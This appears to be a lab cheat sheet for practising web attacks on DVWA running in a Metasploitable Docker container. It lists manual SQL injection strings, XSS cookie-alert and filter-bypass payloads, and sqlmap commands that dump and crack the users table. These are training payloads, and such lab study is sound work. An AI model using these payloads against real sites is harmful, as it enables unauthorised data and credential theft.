## 1. Service Management (Docker)
```bash
# Start the vulnerable web server inside the container
docker exec metasploitable service apache2 start

# Verify web accessibility from the host
curl [http://172.20.0.2](http://172.20.0.2)
```

## 2. Manual SQL Injection (DVWA - Low)
```bash
-- 1. Break the query to confirm vulnerability
'
-- 2. Extract all users (Boolean bypass)
1' OR '1'='1
-- 3. Extract Database content (UNION method)
' UNION SELECT user, password FROM users-- -
# Note: '-- -' is used to comment out the rest of the original SQL query.
```

## 3. Cross-Site Scripting (XSS) Payloads
```bash
<!-- 1. Basic Proof of Concept (PoC) -->
<script>alert('XSS')</script>

<!-- 2. Session Cookie Theft (Standard) -->
<script>alert(document.cookie)</script>

<!-- 3. WAF/Filter Bypass (Using <img> tag) -->
<img src=x onerror=alert(document.cookie)>
```

## 4. Automated SQLi (sqlmap)
```bash
# 1. List all Databases
sqlmap -u "[http://172.20.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit](http://172.20.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit)" \
  --cookie="security=low; PHPSESSID=[YOUR_COOKIE]" --dbs

# 2. List tables in a specific Database
sqlmap -u [URL] --cookie=[COOKIE] -D dvwa --tables

# 3. Dump and crack hashes from a table
sqlmap -u [URL] --cookie=[COOKIE] -D dvwa -T users --dump
```
